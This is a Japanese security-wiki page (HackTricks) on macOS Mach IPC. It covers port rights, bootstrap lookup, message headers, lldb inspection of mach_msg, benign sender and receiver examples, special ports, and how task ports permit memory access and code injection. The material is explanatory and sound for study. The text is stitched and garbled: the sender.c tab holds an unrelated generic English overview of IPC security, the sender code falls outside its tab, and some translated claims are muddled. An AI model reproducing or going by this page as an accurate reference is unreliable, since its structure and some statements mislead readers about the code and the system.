# macOS IPC - プロセス間通信

{% hint style="success" %}
AWSハッキングの学習と実践：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と実践：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、ハッキングトリックを共有してください。

</details>
{% endhint %}

## ポートを介したMachメッセージング

### 基本情報

Machはリソースを共有するための最小単位として**タスク**を使用し、各タスクには**複数のスレッド**が含まれることができます。これらの**タスクとスレッドは、1:1でPOSIXプロセスとスレッドにマップ**されます。

タスク間の通信は、Machプロセス間通信（IPC）を介して行われ、一方向の通信チャネルを利用します。**メッセージはポート間で転送**され、これらはカーネルによって管理される**メッセージキューのように機能**します。

**ポート**はMach IPCの**基本要素**です。これを使用して**メッセージを送信および受信**することができます。

各プロセスには**IPCテーブル**があり、そこには**プロセスのMachポート**が含まれています。Machポートの名前は実際には数値（カーネルオブジェクトへのポインタ）です。

プロセスはまた、ポート名といくつかの権限を**異なるタスクに送信**することができ、カーネルはこれを他のタスクの**IPCテーブルにエントリ**として表示します。

### ポート権限

タスクが実行できる操作を定義するポート権限は、この通信に重要です。可能な**ポート権限**は以下の通りです（[ここからの定義](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）:

* **受信権限**は、ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（multiple-producer, single-consumer）キューであり、システム全体で**各ポートにつき1つの受信権限しか存在しない**ことを意味します（複数のプロセスが1つのパイプの読み取り端に対するファイルディスクリプタをすべて保持できるパイプとは異なります）。
* **受信権限を持つタスク**はメッセージを受信し、**送信権限を作成**できます。元々、**自分のタスクだけがポートに対して受信権限を持っていました**。
* 受信権限の所有者が**死亡**したり、それを終了させた場合、**送信権限は無効になります（デッドネーム）**。
* **送信権限**は、ポートにメッセージを送信することを許可します。
* 送信権限は**クローン**できるため、送信権限を所有するタスクは権限を複製して**第三のタスクに付与**できます。
* **ポート権限**はMacメッセージを介しても**渡す**ことができます。
* **一度だけ送信権限**は、ポートに1つのメッセージを送信してから消える権限です。
* この権限は**クローン**できませんが、**移動**できます。
* **ポートセット権限**は、単一のポートではなく_ポートセット_を示します。ポートセットからメッセージをデキューすると、その中に含まれるポートの1つからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように複数のポートで同時にリッスンするために使用できます。
* **デッドネーム**は実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限がデッドネームに変わります。

**タスクはSEND権限を他のタスクに転送**することができ、それらにメッセージを返す権限を与えることができます。**SEND権限はクローン**することもできるため、タスクは権限を複製して**第三のタスクに権限を与える**ことができます。これにより、**ブートストラップサーバ**と呼ばれる中間プロセスと組み合わせることで、タスク間の効果的な通信が可能となります。

### ファイルポート

ファイルポートは、Macポート（Machポート権限を使用）でファイルディスクリプタをカプセル化することを可能にします。指定されたFDから`fileport_makeport`を使用して`fileport`を作成し、`fileport_makefd`を使用してfileportからFDを作成することができます。

### 通信の確立

前述のように、Machメッセージを使用して権限を送信することが可能ですが、**Machメッセージを送信する権限がない場合は権限を送信することはできません**。では、最初の通信はどのように確立されるのでしょうか？

このために、**ブートストラップサーバ**（macでは**launchd**）が関与します。**誰でもブートストラップサーバにSEND権限を取得**できるため、他のプロセスにメッセージを送信する権限を要求することができます：

1. タスク**A**は**新しいポート**を作成し、その上に**受信権限**を取得します。
2. 受信権限の所有者であるタスク**A**は、ポートのために**SEND権限を生成**します。
3. タスク**A**は**ブートストラップサーバ**と**接続**を確立し、最初に生成したポートの**SEND権限を送信**します。
* 誰でもブートストラップサーバにSEND権限を取得できることを覚えておいてください。
4. タスクAは`bootstrap_register`メッセージをブートストラップサーバに送信して、`com.apple.taska`のような名前で指定されたポートを**関連付け**します。
5. タスク**B**は、サービス名（`bootstrap_lookup`）のためにブートストラップサーバと**対話**します。ブートストラップサーバが応答するために、タスクBはルックアップメッセージ内で**以前に作成したポートに対するSEND権限**を送信します。ルックアップが成功すると、**サーバ**はタスクAから受け取ったSEND権限を**タスクBに複製**し、**タスクBに送信**します。
* 誰でもブートストラップサーバにSEND権限を取得できることを覚えておいてください。
6. このSEND権限を使用して、**タスクB**は**タスクA**に**メッセージを送信**することができます。
7. 双方向通信のために通常、タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、**SEND権限をタスクAに渡す**ことで、タスクBにメッセージを送信できるようにします（双方向通信）。

ブートストラップサーバはサービス名を認証できません。これは、**タスク**が潜在的に**システムタスクをなりすます**可能性があることを意味します。たとえば、認証サービス名を**偽装**して**承認リクエストを承認**することができます。

その後、Appleは**システム提供サービスの名前**を、安全な構成ファイルに格納しています。これらのファイルは、SIPで保護されたディレクトリにあります：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。各サービス名には、**関連するバイナリも格納**されています。ブートストラップサーバは、これらのサービス名ごとに**受信権限を作成**し、保持します。

これらの事前定義されたサービスについては、**ルックアッププロセスがわずかに異なります**。サービス名が検索されると、launchdはサービスを動的に開始します。新しいワークフローは次のとおりです：

* タスク**B**は、サービス名のためにブートストラップ**ルックアップ**を開始します。
* **launchd**は、タスクが実行されているかどうかをチェックし、実行されていない場合は**開始**します。
* タスク**A**（サービス）は**ブートストラップチェックイン**（`bootstrap_check_in()`）を実行します。ここで、**ブートストラップ**サーバはSEND権限を作成し、保持し、**受信権限をタスクAに転送**します。
* launchdは**SEND権限を複製**し、タスクBに送信します。
* タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、**タスクA**（svc）に**SEND権限を渡します**（双方向通信）。

ただし、このプロセスは事前定義されたシステムタスクにのみ適用されます。非システムタスクは引き続き最初に説明したように動作し、なりすましを許可する可能性があります。

{% hint style="danger" %}
したがって、launchdがクラッシュするとシステム全体がクラッシュする可能性があります。
{% endhint %}
### Machメッセージ

[こちらで詳細を確認](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 関数は、基本的にシステムコールであり、Machメッセージの送受信に使用されます。この関数は、送信するメッセージを最初の引数として必要とします。このメッセージは、`mach_msg_header_t` 構造体で始まり、実際のメッセージ内容が続きます。この構造体は以下のように定義されています:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
プロセスは _**受信権**_ を持っていると、Mach ポートでメッセージを受信できます。逆に、**送信者** は _**送信権**_ または _**一度だけ送信権**_ を付与されます。一度だけ送信権は、1回のメッセージ送信にのみ使用され、その後に無効になります。

初期フィールド **`msgh_bits`** はビットマップです:

* 最初のビット（最も重要なビット）は、メッセージが複雑であることを示すために使用されます（後述）
* 3番目と4番目はカーネルによって使用されます
* 2番目のバイトの**最も下位の5ビット** は **バウチャー** に使用できます: キー/値の組み合わせを送信するための別のポートの種類。
* 3番目のバイトの**最も下位の5ビット** は **ローカルポート** に使用できます
* 4番目のバイトの**最も下位の5ビット** は **リモートポート** に使用できます

バウチャー、ローカルポート、リモートポートに指定できるタイプは、[**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) から次の通りです:
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
たとえば、`MACH_MSG_TYPE_MAKE_SEND_ONCE`は、このポートに対して派生および転送される**send-once right**を示すために使用できます。また、`MACH_PORT_NULL`を指定して、受信者が返信できないようにすることもできます。

簡単な**双方向通信**を実現するために、プロセスは、メッセージの**受信者**がこのメッセージに返信を送信できるように、mach **メッセージヘッダー**内の**mach port**を指定できます。これを _reply port_ (**`msgh_local_port`**) と呼びます。

{% hint style="success" %}
この種の双方向通信は、返信を期待するXPCメッセージで使用され、(`xpc_connection_send_message_with_reply`および`xpc_connection_send_message_with_reply_sync`)。ただし、**通常は異なるポートが作成**され、双方向通信が作成されるように前述のように説明されています。
{% endhint %}

メッセージヘッダーの他のフィールドは次のとおりです。

- `msgh_size`: パケット全体のサイズ。
- `msgh_remote_port`: このメッセージが送信されるポート。
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
- `msgh_id`: このメッセージのID、これは受信者によって解釈されます。

{% hint style="danger" %}
**machメッセージは`mach port`を介して送信される**ことに注意してください。これは、machカーネルに組み込まれた**単一の受信者**、**複数の送信者**通信チャネルです。**複数のプロセス**がmachポートに**メッセージを送信**できますが、いつでも**単一のプロセスだけが**それから読み取ることができます。
{% endhint %}

その後、メッセージは**`mach_msg_header_t`**ヘッダーに続いて**本文**と**トレーラー**（ある場合）で形成され、返信する権限を付与することができます。これらの場合、カーネルは単にメッセージを1つのタスクから他のタスクに渡す必要があります。

**トレーラー**は、**カーネルによってメッセージに追加される情報**であり（ユーザーによって設定することはできません）、メッセージ受信時にフラグ`MACH_RCV_TRAILER_<trailer_opt>`でリクエストできます（リクエストできる異なる情報があります）。

#### 複雑なメッセージ

ただし、追加のポート権限を渡すか、メモリを共有するなど、より**複雑な**メッセージもあります。この場合、カーネルはこれらのオブジェクトを受信者に送信する必要があります。この場合、ヘッダー`msgh_bits`の最上位ビットが設定されます。

渡す可能性のある記述子は、[**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)で定義されています。
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Ports APIs

ポートはタスクの名前空間に関連付けられているため、ポートを作成または検索するには、タスクの名前空間もクエリされます（詳細は `mach/mach_port.h` を参照）:

- **`mach_port_allocate` | `mach_port_construct`**: ポートを**作成**する。
- `mach_port_allocate` はポートセットを作成することもできます: ポートのグループに対する受信権限。メッセージを受信するたびに、それがどのポートから送信されたかが示されます。
- `mach_port_allocate_name`: ポートの名前を変更する（デフォルトは32ビット整数）
- `mach_port_names`: ターゲットからポート名を取得する
- `mach_port_type`: タスクが名前に対して持つ権限を取得する
- `mach_port_rename`: ポートの名前を変更する（FDのdup2のようなもの）
- `mach_port_allocate`: 新しいRECEIVE、PORT_SET、またはDEAD_NAMEを割り当てる
- `mach_port_insert_right`: 受信権限を持つポートに新しい権限を作成する
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **machメッセージを送受信**するために使用される関数。上書きバージョンでは、メッセージ受信用に異なるバッファを指定できる（他のバージョンは再利用するだけ）。

### Debug mach\_msg

関数 **`mach_msg`** と **`mach_msg_overwrite`** はメッセージを送受信するために使用される関数なので、これらにブレークポイントを設定すると、送信されたメッセージと受信されたメッセージを検査できます。

たとえば、デバッグできるアプリケーションをデバッグ開始すると、この関数を使用する **`libSystem.B` が読み込まれます**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`** の引数を取得するには、レジスタを確認します。これらは引数です（[mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)から）:
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
レジストリから値を取得します：
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
### 最初の引数をチェックしてメッセージヘッダーを検査します:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
その種類の `mach_msg_bits_t` は、返信を許可するために非常に一般的です。



### ポートを列挙する
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** はポートにデフォルトで与えられる名前です（最初の3バイトでどのように**増加**しているかを確認してください）。 **`ipc-object`** はポートの**難読化**された一意の**識別子**です。\
また、**`send`** 権限のみを持つポートが所有者を**識別**していることに注目してください（ポート名 + pid）。\
また、同じポートに接続された**他のタスクを示す**ために **`+`** の使用にも注目してください。

また、[**procesxp**](https://www.newosxbook.com/tools/procexp.html) を使用して、SIPが無効になっているために `com.apple.system-task-port` の必要性により、**登録されたサービス名** も表示できます：
```
procesp 1 ports
```
iOS でこのツールをインストールするには、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてください。

### コード例

**sender** がポートを**割り当て**、名前 `org.darlinghq.example` の **send right** を作成し、それを **ブートストラップサーバー** に送信する方法に注目してください。送信者はその名前の **send right** を要求し、それを使用して **メッセージを送信** しました。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
## macOS Inter-Process Communication (IPC)

### Overview

Inter-Process Communication (IPC) mechanisms are commonly used in macOS for processes to communicate with each other. This can introduce security risks if not implemented correctly.

### Techniques

1. **Shared Memory**: Processes can share memory segments to communicate with each other. Care must be taken to prevent unauthorized access to sensitive data.

2. **Mach Messages**: Mach is the underlying IPC mechanism in macOS. Messages can be sent between tasks using Mach ports. Secure coding practices should be followed to prevent message interception.

3. **XPC Services**: XPC services allow processes to communicate with each other securely. Developers should validate input and implement proper authentication mechanisms.

### Recommendations

- Always validate input received through IPC mechanisms.
- Implement proper authentication and authorization checks.
- Encrypt sensitive data before sending it over IPC.
- Regularly audit IPC usage for potential security vulnerabilities.

By following secure coding practices and implementing proper security measures, developers can mitigate the risks associated with IPC in macOS.  
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## 特権ポート

特定の機密操作を実行したり、特定の機密データにアクセスしたりすることができる特別なポートがいくつかあります。これらのポートは、それらに対して**SEND**権限を持つタスクがある場合に非常に興味深いものとなります。これは、機能だけでなく、**複数のタスク間でSEND権限を共有**できるためです。

### ホスト特別ポート

これらのポートは番号で表されます。

**SEND** 権限は、**`host_get_special_port`** を呼び出すことで取得でき、**RECEIVE** 権限は **`host_set_special_port`** を呼び出すことで取得できます。ただし、これらの呼び出しには **`host_priv`** ポートが必要で、これにアクセスできるのは root のみです。さらに、過去には root が **`host_set_special_port`** を呼び出して任意のポートを乗っ取ることができ、たとえば `HOST_KEXTD_PORT` を乗っ取ることでコード署名をバイパスすることが可能でした（SIP がこれを防止しています）。

これらは 2 つのグループに分かれています: **最初の 7 つのポートはカーネルが所有**しており、1 が `HOST_PORT`、2 が `HOST_PRIV_PORT`、3 が `HOST_IO_MASTER_PORT`、7 が `HOST_MAX_SPECIAL_KERNEL_PORT` です。\
**8** から始まるポートは **システムデーモンが所有**しており、[**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) で宣言されています。

* **ホストポート**: このポートに対して **SEND** 権限を持つプロセスは、次のようなルーチンを呼び出すことで **システム**に関する**情報**を取得できます:
* `host_processor_info`: プロセッサ情報を取得
* `host_info`: ホスト情報を取得
* `host_virtual_physical_table_info`: 仮想/物理ページテーブル（MACH\_VMDEBUG が必要）
* `host_statistics`: ホスト統計情報を取得
* `mach_memory_info`: カーネルメモリレイアウトを取得
* **ホスト特権ポート**: このポートに対して **SEND** 権限を持つプロセスは、ブートデータを表示したり、カーネル拡張をロードしようとしたりするなど、**特権操作**を実行できます。この権限を取得するには、**プロセスは root である必要があります**。
* さらに、**`kext_request`** API を呼び出すには、Apple バイナリにのみ与えられる **`com.apple.private.kext*`** という他の権限が必要です。
* 呼び出すことができる他のルーチンには以下があります:
* `host_get_boot_info`: `machine_boot_info()` を取得
* `host_priv_statistics`: 特権統計情報を取得
* `vm_allocate_cpm`: 連続した物理メモリを割り当て
* `host_processors`: ホストプロセッサに対する送信権限
* `mach_vm_wire`: メモリを常駐させる
* **root** はこの権限にアクセスできるため、`host_set_[special/exception]_port[s]` を呼び出して **ホストの特別ポートや例外ポートを乗っ取る**ことができます。

すべてのホスト特別ポートを表示することができます。
```bash
procexp all ports | grep "HSP"
```
### タスク特別ポート

これらはよく知られたサービスのために予約されたポートです。`task_[get/set]_special_port`を呼び出すことで取得/設定することができます。これらは`task_special_ports.h`に見つけることができます。
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
[こちら](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)から：

* **TASK\_KERNEL\_PORT**\[task-self send right]: このタスクを制御するために使用されるポート。タスクに影響を与えるメッセージを送信するために使用されます。これは**mach\_task\_self (下記のTask Portsを参照)**によって返されるポートです。
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: タスクのブートストラップポート。他のシステムサービスポートの返却を要求するメッセージを送信するために使用されます。
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: 含まれるホストの情報を要求するために使用されるポート。これは**mach\_host\_self**によって返されるポートです。
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: このタスクが有線カーネルメモリを取得する元を示すポート。
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: このタスクがデフォルトのメモリ管理メモリを取得する元を示すポート。

### タスクポート

元々Machには「プロセス」ではなく「タスク」があり、これはスレッドのコンテナのように考えられていました。MachがBSDと統合された際、**各タスクはBSDプロセスと関連付けられました**。したがって、すべてのBSDプロセスにはプロセスであるために必要な詳細があり、すべてのMachタスクにも内部動作があります（`kernel_task`である存在しないpid 0を除く）。

これに関連する非常に興味深い関数が2つあります：

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 指定された`pid`に関連するタスクのタスクポートのSEND権を取得し、指定された`target_task_port`（通常は`mach_task_self()`を使用した呼び出し元タスクですが、異なるタスク上のSENDポートである場合もあります）にそれを与えます。
* `pid_for_task(task, &pid)`: タスクへのSEND権を取得すると、このタスクが関連付けられているPIDを見つけます。

タスク内でアクションを実行するために、タスクは`mach_task_self()`を呼び出して自身に対する`SEND`権を必要としました（これは`task_self_trap`（28）を使用します）。この権限を持つと、タスクは次のような複数のアクションを実行できます：

* `task_threads`: タスクのスレッドのすべてのタスクポートに対するSEND権を取得
* `task_info`: タスクに関する情報を取得
* `task_suspend/resume`: タスクを一時停止または再開
* `task_[get/set]_special_port`
* `thread_create`: スレッドを作成
* `task_[get/set]_state`: タスクの状態を制御
* その他は[**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)で見つけることができます。

{% hint style="danger" %}
異なるタスクのタスクポートに対するSEND権を持っている場合、異なるタスク上でそのようなアクションを実行できます。
{% endhint %}

さらに、タスクポートは**`vm_map`**ポートでもあり、`vm_read()`や`vm_write()`などの関数を使用してタスク内のメモリを**読み取り、操作**することができます。基本的に、異なるタスクのタスクポートに対するSEND権を持つタスクは、そのタスクに**コードをインジェクト**できることを意味します。

**カーネルもタスクである**ことを覚えておいてください。したがって、誰かが**`kernel_task`に対してSEND権限**を取得すると、カーネルに任意のコードを実行させることができます（ジェイルブレイク）。

* `mach_task_self()`を呼び出して、呼び出し元タスクのこのポートの**名前を取得**します。このポートは**`exec()`**を横断してのみ**継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、`exec()`後のsuidバイナリではタスクも新しいタスクポートを取得します）。タスクを生成してそのポートを取得する唯一の方法は、`fork()`を実行しながら["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
* これらはポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
* アプリが**`com.apple.security.get-task-allow`権限**を持っている場合、**同じユーザーのプロセスがタスクポートにアクセス**できます（デバッグ用にXcodeによって一般的に追加されます）。**ノータリゼーション**プロセスはこれを本番リリースには許可しません。
* **`com.apple.system-task-ports`**権限を持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートを取得**できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleアプリケーションにのみ付与されます。
* **Rootは、ハード化されていない**ランタイムでコンパイルされたアプリケーションのタスクポートにアクセスできます（Apple製品からは除く）。

**タスク名ポート:** _タスクポート_の権限がないバージョン。タスクを参照しますが、制御することはできません。これを介して利用可能な唯一のものは`task_info()`のようです。

### スレッドポート

